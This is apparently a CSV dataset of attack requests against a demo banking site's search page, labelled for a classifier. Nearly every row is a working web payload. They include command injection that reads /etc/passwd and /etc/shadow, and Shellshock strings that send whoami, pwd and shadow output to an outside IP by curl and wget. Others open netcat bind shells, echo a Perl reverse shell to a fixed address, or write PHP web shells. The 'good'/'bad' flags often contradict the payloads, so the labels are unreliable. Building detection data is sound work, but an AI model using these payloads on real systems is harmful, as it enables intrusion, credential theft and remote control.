path,content,host,class_flag
/search.jsp?query=&lt;!--#exec cmd=&quot;/bin/cat /etc/shadow&quot;--&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;!--#exec cmd=&quot;/usr/bin/id;--&gt;,,demo.testfire.net,['bad']
/search.jsp?query=&lt;!--#exec cmd=&quot;/usr/bin/id;--&gt;,,demo.testfire.net,['bad']
/search.jsp?query=;netstat -a;,,demo.testfire.net,['good']
/search.jsp?query=;id;,,demo.testfire.net,['good']
/search.jsp?query=/index.html|id|,,demo.testfire.net,['good']
/search.jsp?query=;id;,,demo.testfire.net,['good']
/search.jsp?query=|id,,demo.testfire.net,['good']
/search.jsp?query=|/usr/bin/id,,demo.testfire.net,['good']
/search.jsp?query=|id|,,demo.testfire.net,['good']
/search.jsp?query=|/usr/bin/id|,,demo.testfire.net,['good']
/search.jsp?query=||/usr/bin/id|,,demo.testfire.net,['good']
/search.jsp?query=|id;,,demo.testfire.net,['good']
/search.jsp?query=||/usr/bin/id;,,demo.testfire.net,['good']
/search.jsp?query=;id|,,demo.testfire.net,['good']
/search.jsp?query=;id,,demo.testfire.net,['good']
/search.jsp?query=;|/usr/bin/id|,,demo.testfire.net,['good']
/search.jsp?query=\n/bin/ls -al\n,,demo.testfire.net,['good']
/search.jsp?query=\n/usr/bin/id\n,,demo.testfire.net,['good']
/search.jsp?query=\nid\n,,demo.testfire.net,['good']
/search.jsp?query=\n/usr/bin/id;,,demo.testfire.net,['good']
/search.jsp?query=\nid;,,demo.testfire.net,['good']
/search.jsp?query=\n/usr/bin/id|,,demo.testfire.net,['good']
/search.jsp?query=\nid|,,demo.testfire.net,['good']
/search.jsp?query=;/usr/bin/id\n,,demo.testfire.net,['good']
/search.jsp?query=`,,demo.testfire.net,['good']
/search.jsp?query=|| ,,demo.testfire.net,['good']
/search.jsp?query=| ,,demo.testfire.net,['good']
/search.jsp?query=; ,,demo.testfire.net,['good']
/search.jsp?query=',,demo.testfire.net,['good']
"/search.jsp?query='""",,demo.testfire.net,['good']
"/search.jsp?query=""",,demo.testfire.net,['good']
"/search.jsp?query=""'",,demo.testfire.net,['good']
/search.jsp?query=& ,,demo.testfire.net,['good']
/search.jsp?query=&& ,,demo.testfire.net,['good']
"/search.jsp?query=%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",,demo.testfire.net,['good']
/search.jsp?query= {${phpinfo()}},,demo.testfire.net,['bad']
/search.jsp?query= {${sleep(20)}},,demo.testfire.net,['bad']
/search.jsp?query= {${sleep(3)}},,demo.testfire.net,['bad']
/search.jsp?query=a|id|,,demo.testfire.net,['good']
/search.jsp?query=a;id|,,demo.testfire.net,['good']
/search.jsp?query=a;id;,,demo.testfire.net,['good']
/search.jsp?query=a;id\n,,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",,demo.testfire.net,['good']
"/search.jsp?query=() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",,demo.testfire.net,['good']
/search.jsp?query=cat /etc/hosts,,demo.testfire.net,['good']
/search.jsp?query=$(`cat /etc/passwd`),,demo.testfire.net,['bad']
/search.jsp?query=cat /etc/passwd,,demo.testfire.net,['good']
/search.jsp?query=() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,,demo.testfire.net,['good']
/search.jsp?query=| curl http://crowdshield.com/.testing/rce.txt,,demo.testfire.net,['good']
/search.jsp?query=& curl http://crowdshield.com/.testing/rce.txt,,demo.testfire.net,['good']
/search.jsp?query=; curl https://crowdshield.com/.testing/rce_vuln.txt,,demo.testfire.net,['good']
/search.jsp?query=&& curl https://crowdshield.com/.testing/rce_vuln.txt,,demo.testfire.net,['good']
/search.jsp?query=curl https://crowdshield.com/.testing/rce_vuln.txt,,demo.testfire.net,['good']
"/search.jsp?query= curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",,demo.testfire.net,['good']
"/search.jsp?query=curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",,demo.testfire.net,['good']
/search.jsp?query=$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),,demo.testfire.net,['bad']
/search.jsp?query=dir,,demo.testfire.net,['good']
/search.jsp?query=| dir,,demo.testfire.net,['good']
/search.jsp?query=; dir,,demo.testfire.net,['good']
/search.jsp?query=$(`dir`),,demo.testfire.net,['bad']
/search.jsp?query=& dir,,demo.testfire.net,['good']
/search.jsp?query=&&dir,,demo.testfire.net,['good']
/search.jsp?query=&& dir,,demo.testfire.net,['good']
/search.jsp?query=| dir C:\,,demo.testfire.net,['good']
/search.jsp?query=; dir C:\,,demo.testfire.net,['good']
/search.jsp?query=& dir C:\,,demo.testfire.net,['good']
/search.jsp?query=&& dir C:\,,demo.testfire.net,['good']
/search.jsp?query=dir C:\,,demo.testfire.net,['good']
/search.jsp?query=| dir C:\Documents and Settings\*,,demo.testfire.net,['good']
/search.jsp?query=; dir C:\Documents and Settings\*,,demo.testfire.net,['good']
/search.jsp?query=& dir C:\Documents and Settings\*,,demo.testfire.net,['good']
/search.jsp?query=&& dir C:\Documents and Settings\*,,demo.testfire.net,['good']
/search.jsp?query=dir C:\Documents and Settings\*,,demo.testfire.net,['good']
/search.jsp?query=| dir C:\Users,,demo.testfire.net,['good']
/search.jsp?query=& dir C:\Users,,demo.testfire.net,['good']
/search.jsp?query=; dir C:\Users,,demo.testfire.net,['good']
/search.jsp?query=&& dir C:\Users,,demo.testfire.net,['good']
/search.jsp?query=dir C:\Users,,demo.testfire.net,['good']
/search.jsp?query=;echo '<script>alert(1)</script>',,demo.testfire.net,['good']
/search.jsp?query=echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,,demo.testfire.net,['good']
"/search.jsp?query=| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",,demo.testfire.net,['bad']
"/search.jsp?query=& echo ""<?php include($_GET['page']); ?>"" > rfi.php",,demo.testfire.net,['bad']
"/search.jsp?query=&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",,demo.testfire.net,['bad']
"/search.jsp?query=echo ""<?php include($_GET['page']); ?>"" > rfi.php",,demo.testfire.net,['bad']
"/search.jsp?query=; echo ""<?php include($_GET['page']); ?>"" > rfi.php",,demo.testfire.net,['bad']
"/search.jsp?query=| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",,demo.testfire.net,['bad']
"/search.jsp?query=; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",,demo.testfire.net,['bad']
"/search.jsp?query=& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",,demo.testfire.net,['bad']
"/search.jsp?query=&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",,demo.testfire.net,['bad']
"/search.jsp?query=echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",,demo.testfire.net,['bad']
"/search.jsp?query=| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",,demo.testfire.net,['bad']
"/search.jsp?query=; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",,demo.testfire.net,['bad']
"/search.jsp?query=&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",,demo.testfire.net,['bad']
"/search.jsp?query=& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",,demo.testfire.net,['bad']
"/search.jsp?query=echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",,demo.testfire.net,['bad']
/search.jsp?query=;echo '<script>alert(1)</script>',,demo.testfire.net,['good']
/search.jsp?query=echo '<script>alert(1)</script>'// XXXXXXXXXXX,,demo.testfire.net,['good']
/search.jsp?query=echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,,demo.testfire.net,['good']
"/search.jsp?query=| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",,demo.testfire.net,['bad']
"/search.jsp?query=; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",,demo.testfire.net,['bad']
"/search.jsp?query=& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",,demo.testfire.net,['bad']
"/search.jsp?query=&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",,demo.testfire.net,['bad']
"/search.jsp?query=echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",,demo.testfire.net,['bad']
/search.jsp?query=() { :;}; echo vulnerable 10,,demo.testfire.net,['good']
/search.jsp?query=eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),,demo.testfire.net,['good']
/search.jsp?query=eval('ls'),,demo.testfire.net,['good']
/search.jsp?query=eval('pwd'),,demo.testfire.net,['good']
/search.jsp?query=eval('pwd');,,demo.testfire.net,['good']
/search.jsp?query=eval('sleep 5'),,demo.testfire.net,['good']
/search.jsp?query=eval('sleep 5');,,demo.testfire.net,['good']
/search.jsp?query=eval('whoami'),,demo.testfire.net,['good']
/search.jsp?query=eval('whoami');,,demo.testfire.net,['good']
/search.jsp?query=exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),,demo.testfire.net,['good']
/search.jsp?query=exec('ls'),,demo.testfire.net,['good']
/search.jsp?query=exec('pwd'),,demo.testfire.net,['good']
/search.jsp?query=exec('pwd');,,demo.testfire.net,['good']
/search.jsp?query=exec('sleep 5'),,demo.testfire.net,['good']
/search.jsp?query=exec('sleep 5');,,demo.testfire.net,['good']
/search.jsp?query=exec('whoami'),,demo.testfire.net,['good']
"/search.jsp?query=;{$_GET[""cmd""]}",,demo.testfire.net,['bad']
/search.jsp?query=exec('whoami');,,demo.testfire.net,['good']
/search.jsp?query=`id`,,demo.testfire.net,['good']
/search.jsp?query=|id,,demo.testfire.net,['good']
/search.jsp?query=| id,,demo.testfire.net,['good']
/search.jsp?query=;id,,demo.testfire.net,['good']
/search.jsp?query=;id|,,demo.testfire.net,['good']
/search.jsp?query=;id;,,demo.testfire.net,['good']
/search.jsp?query=& id,,demo.testfire.net,['good']
/search.jsp?query=&&id,,demo.testfire.net,['good']
/search.jsp?query=;id\n,,demo.testfire.net,['good']
/search.jsp?query=ifconfig,,demo.testfire.net,['good']
/search.jsp?query=| ifconfig,,demo.testfire.net,['good']
/search.jsp?query=; ifconfig,,demo.testfire.net,['good']
/search.jsp?query=& ifconfig,,demo.testfire.net,['good']
/search.jsp?query=&& ifconfig,,demo.testfire.net,['good']
/search.jsp?query=/index.html|id|,,demo.testfire.net,['good']
/search.jsp?query=ipconfig,,demo.testfire.net,['good']
/search.jsp?query=| ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=; ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=& ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=&& ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=ipconfig /all,,demo.testfire.net,['good']
/search.jsp?query=ls,,demo.testfire.net,['good']
/search.jsp?query=| ls -l /,,demo.testfire.net,['good']
/search.jsp?query=$(`ls`),,demo.testfire.net,['bad']
/search.jsp?query=; ls -l /,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /,,demo.testfire.net,['good']
/search.jsp?query=ls -l /,,demo.testfire.net,['good']
/search.jsp?query=| ls -laR /etc,,demo.testfire.net,['good']
/search.jsp?query=; ls -laR /etc,,demo.testfire.net,['good']
/search.jsp?query=& ls -laR /etc,,demo.testfire.net,['good']
/search.jsp?query=&& ls -laR /etc,,demo.testfire.net,['good']
/search.jsp?query=| ls -laR /var/www,,demo.testfire.net,['good']
/search.jsp?query=& ls -laR /var/www,,demo.testfire.net,['good']
/search.jsp?query=; ls -laR /var/www,,demo.testfire.net,['good']
/search.jsp?query=&& ls -laR /var/www,,demo.testfire.net,['good']
/search.jsp?query=| ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=; ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=ls -l /etc/,,demo.testfire.net,['good']
/search.jsp?query=ls -lh /etc/,,demo.testfire.net,['good']
/search.jsp?query=| ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=; ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=ls -l /home/*,,demo.testfire.net,['good']
/search.jsp?query=*; ls -lhtR /var/www/,,demo.testfire.net,['good']
/search.jsp?query=| ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=; ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=ls -l /tmp,,demo.testfire.net,['good']
/search.jsp?query=| ls -l /var/www/*,,demo.testfire.net,['good']
/search.jsp?query=; ls -l /var/www/*,,demo.testfire.net,['good']
/search.jsp?query=& ls -l /var/www/*,,demo.testfire.net,['good']
/search.jsp?query=&& ls -l /var/www/*,,demo.testfire.net,['good']
/search.jsp?query=ls -l /var/www/*,,demo.testfire.net,['good']
"/search.jsp?query=<!--#exec cmd=""/bin/cat /etc/passwd""-->",,demo.testfire.net,['bad']
"/search.jsp?query=<!--#exec cmd=""/bin/cat /etc/shadow""-->",,demo.testfire.net,['bad']
"/search.jsp?query=<!--#exec cmd=""/usr/bin/id;-->",,demo.testfire.net,['bad']
/search.jsp?query=\n,,demo.testfire.net,['good']
/search.jsp?query=\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,,demo.testfire.net,['good']
/search.jsp?query=\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,,demo.testfire.net,['good']
/search.jsp?query=\n/bin/ls -al\n,,demo.testfire.net,['good']
/search.jsp?query=| nc -lvvp 4444 -e /bin/sh|,,demo.testfire.net,['good']
/search.jsp?query=; nc -lvvp 4444 -e /bin/sh;,,demo.testfire.net,['good']
/search.jsp?query=& nc -lvvp 4444 -e /bin/sh&,,demo.testfire.net,['good']
/search.jsp?query=&& nc -lvvp 4444 -e /bin/sh &,,demo.testfire.net,['good']
/search.jsp?query=nc -lvvp 4444 -e /bin/sh,,demo.testfire.net,['good']
/search.jsp?query=nc -lvvp 4445 -e /bin/sh &,,demo.testfire.net,['good']
